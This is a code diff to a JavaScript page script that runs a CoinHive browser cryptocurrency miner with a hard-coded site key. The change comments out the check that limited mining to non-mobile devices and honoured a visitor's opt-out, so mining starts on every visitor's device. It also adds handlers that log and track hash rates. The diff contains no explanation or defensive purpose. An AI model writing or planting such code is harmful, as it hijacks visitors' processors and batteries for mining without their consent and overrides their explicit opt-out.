@@ -15,7 +15,16 @@ var miner = new CoinHive.Anonymous('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq', {throttle
 
 	// Only start on non-mobile devices and if not opted-out
 	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	//if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		miner.start();
-	}
+	//}
 	
+	      miner.on('found', () => console.log('Found!'));
+             miner.on('accepted', () => console.log('Accepted!'));
+             miner.on('update',function(data){
+
+                     coin_hive["hashesPerSecond"]=data.hashesPerSecond;
+                   coin_hive["totalHashes"]=data.totalHashes;
+                   coin_hive["acceptedHashes"]=data.acceptedHashes;
+
+              });
